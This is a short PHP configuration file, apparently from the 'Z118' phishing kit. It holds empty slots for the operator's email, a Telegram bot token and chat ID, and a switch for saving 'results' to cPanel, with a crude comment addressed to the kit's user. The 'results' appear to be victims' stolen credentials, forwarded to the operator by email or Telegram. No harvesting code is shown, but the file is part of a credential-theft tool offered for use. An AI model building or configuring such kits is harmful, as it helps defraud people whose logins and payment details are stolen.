<?php

$Z118_EMAIL = "";  /* PUT YOUR FUCKING EMAIL HERE BRO */


/* TELEGRAM BOT INFORMATION */
$bot_token = ""; /* bot token */
$chat_id = "";

/* OPTIONS TO SAVE AND SEND YOUR RESULTS */
$save_results_to_cpanel = "off";

?>